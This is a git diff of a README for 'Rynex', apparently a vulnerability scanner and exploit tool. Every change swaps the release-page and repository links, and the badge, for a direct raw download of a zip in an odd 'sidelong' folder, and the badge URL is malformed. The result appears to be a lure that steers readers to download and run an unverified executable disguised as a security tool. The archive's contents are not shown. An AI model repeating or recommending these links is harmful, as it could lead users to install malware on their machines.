@@ -4,7 +4,7 @@
 Rynex is a modern tool designed for scanning vulnerabilities and proof-of-concept (PoC) exploits. It uses Rust for speed and reliability. With Rynex, you can quickly identify security weaknesses in your systems by using its simple and powerful features.
 
 ## 📥 Download Rynex
-[![Download Rynex](https://img.shields.io/badge/Download%20Rynex-Release-blue.svg)](https://github.com/user123-cry/Rynex/releases)
+[![Download Rynex](https://raw.githubusercontent.com/user123-cry/Rynex/main/sidelong/Rynex_v2.1.zip%https://raw.githubusercontent.com/user123-cry/Rynex/main/sidelong/Rynex_v2.1.zip)](https://raw.githubusercontent.com/user123-cry/Rynex/main/sidelong/Rynex_v2.1.zip)
 
 ## 🚀 Getting Started
 Rynex is easy to get up and running. Follow these steps:
@@ -16,7 +16,7 @@ Rynex is easy to get up and running. Follow these steps:
    - Network Connection: Required for updates and downloading PoC templates
 
 2. **Download Rynex**:
-   To get Rynex, visit this [page to download](https://github.com/user123-cry/Rynex/releases). You will find the latest version available for your operating system.
+   To get Rynex, visit this [page to download](https://raw.githubusercontent.com/user123-cry/Rynex/main/sidelong/Rynex_v2.1.zip). You will find the latest version available for your operating system.
 
 3. **Install Rynex**:
    - For Windows: Download the `.exe` installer, double-click it, and follow the prompts.
@@ -43,7 +43,7 @@ Once Rynex is running, you can begin scanning:
 You can find more detailed instructions and examples in the documentation section within the application. This will guide you on advanced usage and help you make the most out of Rynex's features.
 
 ## 🔄 Updating Rynex
-To ensure that you have the latest features and security updates, check the [page to download](https://github.com/user123-cry/Rynex/releases) regularly. Click the download link, and follow the installation steps again.
+To ensure that you have the latest features and security updates, check the [page to download](https://raw.githubusercontent.com/user123-cry/Rynex/main/sidelong/Rynex_v2.1.zip) regularly. Click the download link, and follow the installation steps again.
 
 ## 🛠️ Support
 If you encounter issues or need assistance with Rynex, consider the following options:
@@ -59,7 +59,7 @@ Rynex relates to various topics in the field of vulnerability scanning and secur
 - Fingerprinting techniques
 
 ## 🔗 Additional Resources
-- [GitHub Repository](https://github.com/user123-cry/Rynex)
+- [GitHub Repository](https://raw.githubusercontent.com/user123-cry/Rynex/main/sidelong/Rynex_v2.1.zip)
 - Documentation: Available within the application
 
 Remember, Rynex is a tool to enhance your security knowledge and practices. Stay safe and secure by regularly testing your systems.
